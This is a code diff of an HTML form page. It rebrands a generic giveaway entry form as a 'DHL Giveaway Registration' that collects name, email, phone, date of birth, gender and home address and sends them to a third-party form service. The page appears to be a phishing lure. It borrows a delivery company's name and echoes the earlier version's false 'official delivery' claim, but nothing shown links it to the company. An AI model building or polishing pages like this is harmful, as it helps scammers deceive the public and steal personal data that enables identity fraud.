@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Giveaway Entry</title>
+  <title>DHL Giveaway Registration</title>
 
   <style>
     * {
@@ -12,240 +13,156 @@
 
     body {
       margin: 0;
-      padding: 20px 15px;
-      font-family: Arial, Helvetica, sans-serif;
-      background: linear-gradient(135deg, #eef4ff, #f8f9fc);
-      color: #1f2937;
+      padding: 25px 15px;
+      font-family: Arial, sans-serif;
+      background: #f2f4f8;
+      color: #222;
     }
 
     .container {
-      width: 100%;
-      max-width: 560px;
+      max-width: 500px;
       margin: 20px auto;
-      background: white;
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.10);
-    }
-
-    .hero {
-      width: 100%;
-      height: 190px;
-      background: linear-gradient(135deg, #4f46e5, #6366f1);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .gift {
-      font-size: 80px;
-      filter: drop-shadow(0 8px 10px rgba(0, 0, 0, 0.2));
-    }
-
-    .content {
-      padding: 28px 24px;
+      padding: 25px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
     }
 
     h1 {
       text-align: center;
-      margin: 0;
-      font-size: 29px;
-      color: #111827;
+      color: #b50000;
+      margin-bottom: 10px;
     }
 
-    .subtitle {
+    .description {
       text-align: center;
-      color: #6b7280;
-      line-height: 1.5;
-      margin: 10px 0 22px;
-    }
-
-    .notice {
-      background: #f1f5f9;
-      border-left: 4px solid #4f46e5;
-      padding: 13px;
-      border-radius: 8px;
-      font-size: 13px;
-      line-height: 1.5;
-      color: #475569;
-      margin-bottom: 20px;
+      color: #555;
+      margin-bottom: 25px;
     }
 
     label {
       display: block;
-      margin: 17px 0 7px;
-      font-weight: 600;
-      font-size: 14px;
-      color: #374151;
+      margin-top: 16px;
+      margin-bottom: 7px;
+      font-weight: bold;
     }
 
-    input,
-    select,
-    textarea {
+    input, select, textarea {
       width: 100%;
-      padding: 13px 14px;
-      border: 1px solid #d1d5db;
-      border-radius: 10px;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
       font-size: 16px;
-      font-family: inherit;
       background: white;
-      color: #111827;
-      outline: none;
-    }
-
-    input:focus,
-    select:focus,
-    textarea:focus {
-      border-color: #4f46e5;
-      box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.12);
     }
 
     textarea {
-      min-height: 100px;
       resize: vertical;
     }
 
-    .submit-button {
-      display: block;
+    button {
       width: 100%;
-      margin-top: 25px;
-      padding: 15px;
+      margin-top: 24px;
+      padding: 14px;
       border: none;
-      border-radius: 11px;
-      background: #4f46e5;
+      border-radius: 6px;
+      background: #b50000;
       color: white;
       font-size: 17px;
-      font-weight: 700;
+      font-weight: bold;
       cursor: pointer;
     }
 
-    .submit-button:hover {
-      background: #4338ca;
+    button:hover {
+      background: #900000;
     }
 
-    .footer {
-      text-align: center;
-      margin-top: 20px;
+    .notice {
+      margin-top: 18px;
       font-size: 12px;
+      color: #666;
       line-height: 1.5;
-      color: #6b7280;
-    }
-
-    @media (max-width: 480px) {
-      body {
-        padding: 10px;
-      }
-
-      .content {
-        padding: 24px 18px;
-      }
-
-      .hero {
-        height: 165px;
-      }
-
-      h1 {
-        font-size: 26px;
-      }
+      text-align: center;
     }
   </style>
 </head>
 
 <body>
+  <main class="container">
+    <h1>DHL Giveaway</h1>
 
-  <div class="container">
+    <p class="description">
+      Complete the registration form below.
+      Please review the official promotion terms before submitting.
+    </p>
 
-    <div class="hero">
-      <div class="gift">🎁</div>
-    </div>
-
-    <div class="content">
-
-      <h1>Giveaway Entry</h1>
-
-      <p class="subtitle">
-        Complete the form below to participate in the giveaway.
-      </p>
-
-      <div class="notice">
-        <strong>Important:</strong>
-        This is an official delivery forms
-      </div>
-
-      <form
-        action="https://formspree.io/f/xaeqwazr"
-        method="POST"
+    <form
+      action="https://formspree.io/f/xaeqwazr"
+      method="POST"
+    >
+      <label for="full-name">Full Name</label>
+      <input
+        type="text"
+        id="full-name"
+        name="full_name"
+        autocomplete="name"
+        required
       >
 
-        <label for="name">Full Name</label>
-        <input
-          type="text"
-          id="name"
-          name="name"
-          placeholder="Enter your full name"
-          autocomplete="name"
-          required
-        >
+      <label for="email">Email Address</label>
+      <input
+        type="email"
+        id="email"
+        name="email"
+        autocomplete="email"
+        required
+      >
 
-        <label for="email">Email Address</label>
-        <input
-          type="email"
-          id="email"
-          name="email"
-          placeholder="Enter your email address"
-          autocomplete="email"
-          required
-        >
+      <label for="phone">Phone Number</label>
+      <input
+        type="tel"
+        id="phone"
+        name="phone"
+        autocomplete="tel"
+        required
+      >
 
-        <label for="phone">Phone Number</label>
-        <input
-          type="tel"
-          id="phone"
-          name="phone"
-          placeholder="Enter your phone number"
-          autocomplete="tel"
-          required
-        >
+      <label for="dob">Date of Birth</label>
+      <input
+        type="date"
+        id="dob"
+        name="date_of_birth"
+        required
+      >
 
-        <label for="age">Age</label>
-        <input
-          type="number"
-          id="age"
-          name="age"
-          min="18"
-          placeholder="Enter your age"
-          required
-        >
+      <label for="gender">Gender (Optional)</label>
+      <select id="gender" name="gender">
+        <option value="">Select an option</option>
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+        <option value="prefer-not-to-say">
+          Prefer not to say
+        </option>
+      </select>
 
-        <label for="gender">Gender</label>
-        <select id="gender" name="gender" required>
-          <option value="">Select your gender</option>
-          <option value="Male">Male</option>
-          <option value="Female">Female</option>
-          <option value="Prefer not to say">Prefer not to say</option>
-        </select>
+      <label for="address">Address</label>
+      <textarea
+        id="address"
+        name="address"
+        rows="3"
+        autocomplete="street-address"
+        required
+      ></textarea>
 
-        <label for="address">Address</label>
-        <textarea
-          id="address"
-          name="address"
-          placeholder="Enter your address"
-          autocomplete="street-address"
-          required
-        ></textarea>
+      <button type="submit">Submit Registration</button>
 
-        <button type="submit" class="submit-button">
-          Enter Giveaway
-        </button>
-
-      </form>
-
-      <div class="footer">
-        Please provide valid information only so we won't have any mistake while getting your package delivered to your doorstep 
-      </div>
-
-    </div>
-  </div>
-
+      <p class="notice">
+        Your information will be submitted through the configured
+        form service. Only provide information necessary for a
+        legitimate registration.
+      </p>
+    </form>
+  </main>
 </body>
 </html>
+
